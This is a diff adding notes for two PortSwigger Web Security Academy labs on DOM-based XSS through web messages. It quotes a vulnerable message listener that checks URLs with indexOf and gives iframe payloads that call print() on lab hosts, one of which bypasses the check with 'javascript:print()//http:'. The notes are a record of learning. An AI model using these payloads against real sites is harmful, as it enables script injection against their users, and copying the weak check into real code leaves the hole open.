@@ -15,4 +15,20 @@ DOM XSS using web messages
 // add onload event with relevant function to trigger event listener on target
 <iframe src="https://0a98009a03cae75a82bd421e005a006d.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
 
+===
+
+DOM XSS using web messages and a JavaScript URL
+
+// target has event listener
+<script>
+  window.addEventListener('message', function(e) {
+    var url = e.data;
+    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
+      location.href = url;
+    }
+  }, false);
+</script>
+
+// example payload
+<iframe src="https://0adf006c046dd455e6f30eb3006300f4.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
 
